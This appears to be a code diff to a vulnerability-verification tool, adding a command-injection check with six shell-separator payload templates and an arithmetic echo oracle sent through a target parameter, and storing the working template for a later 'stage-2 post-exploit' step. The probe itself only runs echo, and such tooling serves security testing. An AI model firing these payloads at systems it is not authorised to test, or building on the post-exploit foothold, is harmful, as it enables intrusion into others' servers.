@@ -44,6 +44,9 @@ class VerifyResult:
     proof: str = ""                 # one-line human proof statement
     evidence: List[str] = field(default_factory=list)
     requests: int = 0
+    # Carries what a stage-2 post-exploit step needs to reuse the foothold
+    # (e.g. the working command-injection payload template). Empty otherwise.
+    context: dict = field(default_factory=dict)
 
 
 class Technique:
@@ -166,6 +169,56 @@ class OpenRedirect(Technique):
         return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=1)
 
 
+# Command-injection payload templates. ``seq`` means the separator can chain a
+# whole command SEQUENCE (needed by stage-2 proof, which runs marker; cmd;
+# marker); substitution forms run a single command only, so they confirm but do
+# not drive stage-2 extraction. ``{cmd}`` is where a command is spliced.
+_CMDI_TEMPLATES = (
+    (";{cmd}", True),      # ; cmd
+    ("\n{cmd}", True),     # newline cmd
+    ("&&{cmd}", True),     # && cmd
+    ("|{cmd}", True),      # | cmd
+    ("$({cmd})", False),   # $(cmd)
+    ("`{cmd}`", False),    # `cmd`
+)
+
+
+class CommandInjection(Technique):
+    name = "cmdi"
+    cwe = "CWE-78"
+    applies_cwes = ("CWE-78",)
+    applies_keywords = ("command inject", "os command", "cmdi", "rce",
+                        "remote code")
+
+    # Reflection-immune oracle: the injected command echoes a marker joined to
+    # an ARITHMETIC result the shell must compute. A server that merely reflects
+    # our input shows the literal `$((A*B))`; only actual execution shows the
+    # product, so a reflect-and-execute target is still correctly confirmed.
+    _A, _B = 1337, 7919
+
+    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
+        # Confirm read-only: `echo` + shell arithmetic changes nothing.
+        ev = [f"param {param!r} probed with a command-injection arithmetic oracle"]
+        token = f"{MARKER}ci"
+        expect = f"{token}-{self._A * self._B}"       # e.g. aeg1s7k9zci-10587703
+        requests = 0
+        for tmpl, seq in _CMDI_TEMPLATES:
+            inj = tmpl.format(cmd=f"echo {token}-$(({self._A}*{self._B}))")
+            resp = transport.send("GET", url, {param: f"x{inj}"})
+            requests += 1
+            if resp.ok and expect in resp.body:
+                # the product appears → the shell evaluated our arithmetic;
+                # a reflected literal `$((..))` would not contain it.
+                proof = (f"OS command injection confirmed on {param!r}: injected "
+                         f"shell arithmetic was evaluated (syntax {tmpl!r})")
+                ev.append(f"computed oracle {expect!r} observed (syntax {tmpl!r})")
+                return VerifyResult(
+                    True, self.name, self.cwe, proof, ev, requests=requests,
+                    context={"template": tmpl, "seq": seq, "param": param})
+        ev.append("no evaluated-command output observed")
+        return VerifyResult(False, self.name, self.cwe, "", ev, requests=requests)
+
+
 def _similar(a: str, b: str) -> bool:
     """Cheap response-similarity oracle for boolean SQLi.
 
@@ -180,7 +233,7 @@ def _similar(a: str, b: str) -> bool:
     return abs(la - lb) <= max(64, int(0.05 * hi))
 
 
-ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect())
+ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect(), CommandInjection())
 
 
 def technique_for(finding_kind: str) -> Optional[Technique]:
@@ -191,4 +244,5 @@ def technique_for(finding_kind: str) -> Optional[Technique]:
 
 
 __all__ = ["MARKER", "Probe", "VerifyResult", "Technique", "ReflectedXSS",
-           "BooleanSQLi", "OpenRedirect", "ALL_TECHNIQUES", "technique_for"]
+           "BooleanSQLi", "OpenRedirect", "CommandInjection", "_CMDI_TEMPLATES",
+           "ALL_TECHNIQUES", "technique_for"]
